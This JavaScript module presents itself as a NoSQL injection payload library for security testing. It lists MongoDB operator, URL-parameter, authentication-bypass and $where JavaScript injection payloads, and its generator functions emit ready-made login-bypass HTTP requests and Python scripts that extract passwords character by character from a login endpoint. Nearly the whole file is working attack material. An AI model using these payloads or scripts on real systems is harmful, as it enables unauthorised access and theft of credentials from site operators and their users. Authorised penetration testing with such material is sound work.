// NoSQL Injection Vulnerability Payloads
// Comprehensive payload database for NoSQL injection security testing

const NoSQLPayloads = {
    // MongoDB operator injection
    operatorInjection: [
        { payload: '{"$gt":""}', description: 'Greater than empty - always true' },
        { payload: '{"$ne":""}', description: 'Not equal empty - bypass auth' },
        { payload: '{"$ne":null}', description: 'Not equal null' },
        { payload: '{"$gt":undefined}', description: 'Greater than undefined' },
        { payload: '{"$regex":".*"}', description: 'Regex match all' },
        { payload: '{"$regex":"^a"}', description: 'Regex starts with a' },
        { payload: '{"$exists":true}', description: 'Field exists check' },
        { payload: '{"$in":[]}', description: 'In empty array' },
        { payload: '{"$nin":[]}', description: 'Not in empty array' },
        { payload: '{"$or":[{},{"a":"a"}]}', description: 'OR always true' }
    ],

    // URL parameter injection
    urlInjection: [
        { payload: 'username[$ne]=invalid', description: 'URL param not equal' },
        { payload: 'username[$gt]=', description: 'URL param greater than' },
        { payload: 'username[$regex]=.*', description: 'URL param regex' },
        { payload: 'password[$ne]=x', description: 'Password bypass' },
        { payload: 'user[$exists]=true', description: 'User exists check' }
    ],

    // Authentication bypass
    authBypass: [
        {
            payload: '{"username":{"$ne":""},"password":{"$ne":""}}',
            description: 'Login bypass - both not empty'
        },
        {
            payload: '{"username":"admin","password":{"$gt":""}}',
            description: 'Admin login bypass'
        },
        {
            payload: '{"username":{"$regex":"admin"},"password":{"$ne":""}}',
            description: 'Regex admin with any password'
        },
        {
            payload: '{"$or":[{"username":"admin"},{"username":"administrator"}],"password":{"$ne":""}}',
            description: 'OR admin/administrator'
        }
    ],

    // JavaScript injection (MongoDB $where)
    jsInjection: [
        { payload: "' || '1'=='1", description: 'Classic JS OR true' },
        { payload: "';return true;'", description: 'Return true injection' },
        { payload: "';return this.password;'", description: 'Extract password' },
        { payload: "';return this.username=='admin';'", description: 'Check admin user' },
        { payload: "1;sleep(5000)", description: 'Time-based - 5s delay' },
        { payload: "1;(function(){var x=new Date();while(new Date()-x<5000){};})()", description: 'JS time delay' }
    ],

    // Data extraction
    dataExtraction: [
        {
            payload: '{"$where":"this.password.match(/^a.*/)==null"}',
            description: 'Extract password char by char'
        },
        {
            payload: '{"password":{"$regex":"^a"}}',
            description: 'Password starts with a'
        },
        {
            payload: '{"password":{"$regex":"^admin"}}',
            description: 'Password starts with admin'
        }
    ],

    // NoSQL specific operators
    operators: [
        '$gt', '$gte', '$lt', '$lte', '$ne', '$nin', '$in',
        '$or', '$and', '$not', '$nor', '$exists', '$type',
        '$regex', '$where', '$text', '$expr', '$mod'
    ],

    // Alphabet for extraction
    extractionChars: 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*',

    // Common field names
    commonFields: [
        'username', 'password', 'email', 'user', 'pass',
        'token', 'secret', 'apikey', 'api_key', 'admin'
    ]
};

// Test types
const NoSQLTests = {
    operator: {
        name: 'Operator Injection',
        description: 'Inject MongoDB operators',
        severity: 'HIGH'
    },
    auth: {
        name: 'Authentication Bypass',
        description: 'Bypass login with operators',
        severity: 'CRITICAL'
    },
    js: {
        name: 'JavaScript Injection',
        description: '$where clause injection',
        severity: 'CRITICAL'
    },
    extract: {
        name: 'Data Extraction',
        description: 'Extract data via regex',
        severity: 'HIGH'
    },
    blind: {
        name: 'Blind NoSQL Injection',
        description: 'Time-based detection',
        severity: 'HIGH'
    }
};

// Helper functions
function getOperatorPayloads() {
    return NoSQLPayloads.operatorInjection;
}

function getURLPayloads() {
    return NoSQLPayloads.urlInjection;
}

function getAuthBypassPayloads() {
    return NoSQLPayloads.authBypass;
}

function getJSPayloads() {
    return NoSQLPayloads.jsInjection;
}

function getExtractionPayloads() {
    return NoSQLPayloads.dataExtraction;
}

function getPayloadCount() {
    return NoSQLPayloads.operatorInjection.length +
        NoSQLPayloads.urlInjection.length +
        NoSQLPayloads.authBypass.length +
        NoSQLPayloads.jsInjection.length +
        NoSQLPayloads.dataExtraction.length;
}

function generateExploit(type) {
    switch (type) {
        case 'authbypass':
            return `# NoSQL Authentication Bypass

# JSON body injection
POST /login HTTP/1.1
Content-Type: application/json

{
  "username": {"$ne": ""},
  "password": {"$ne": ""}
}

# This bypasses auth by selecting any user where:
# username is NOT empty AND password is NOT empty

# URL parameter injection
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username[$ne]=invalid&password[$ne]=invalid

# Specific admin bypass
{
  "username": "admin",
  "password": {"$gt": ""}
}`;

        case 'operator':
            return `# NoSQL Operator Injection

# Common operators for injection:
$gt   - Greater than
$gte  - Greater than or equal
$lt   - Less than
$ne   - Not equal
$in   - In array
$nin  - Not in array
$or   - Logical OR
$regex - Regular expression

# Example: Extract all users
GET /users?username[$ne]=invalid

# Example: Find admin
GET /users?username[$regex]=^admin

# Example: Bypass filter
{
  "username": {"$gt": ""},
  "password": {"$exists": true}
}`;

        case 'extract':
            return `# NoSQL Data Extraction via Regex

# Extract password character by character
import requests

def extract_password(url, username):
    password = ""
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    
    while True:
        found = False
        for c in chars:
            payload = {
                "username": username,
                "password": {"$regex": f"^{password}{c}"}
            }
            r = requests.post(url, json=payload)
            if "success" in r.text:
                password += c
                print(f"Found: {password}")
                found = True
                break
        if not found:
            break
    
    return password

# Usage
password = extract_password("https://target.com/login", "admin")
print(f"Password: {password}")`;

        case 'js':
            return `# NoSQL JavaScript Injection ($where)

# Basic JS injection
{
  "$where": "this.username == 'admin'"
}

# Return true to bypass
{
  "username": "admin",
  "$where": "1==1"
}

# Time-based blind injection
{
  "$where": "function() { 
    if(this.username == 'admin') { 
      sleep(5000); 
    } 
    return true; 
  }"
}

# Extract data
{
  "$where": "function() {
    return this.password.charAt(0) == 'a';
  }"
}`;

        default:
            return '';
    }
}

// Generate extraction script
function generateExtractionScript(fieldName) {
    return `
# Extract ${fieldName} field via regex
import requests
import string

url = "https://target.com/login"
extracted = ""
chars = string.ascii_lowercase + string.digits

while True:
    found = False
    for c in chars:
        payload = {"${fieldName}": {"$regex": f"^{extracted}{c}"}}
        r = requests.post(url, json=payload)
        if r.status_code == 200 and "success" in r.text.lower():
            extracted += c
            print(f"[+] Found: {extracted}")
            found = True
            break
    if not found:
        break

print(f"[*] Final value: {extracted}")
`;
}

// Export
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        NoSQLPayloads,
        NoSQLTests,
        getOperatorPayloads,
        getURLPayloads,
        getAuthBypassPayloads,
        getJSPayloads,
        getExtractionPayloads,
        getPayloadCount,
        generateExploit,
        generateExtractionScript
    };
}
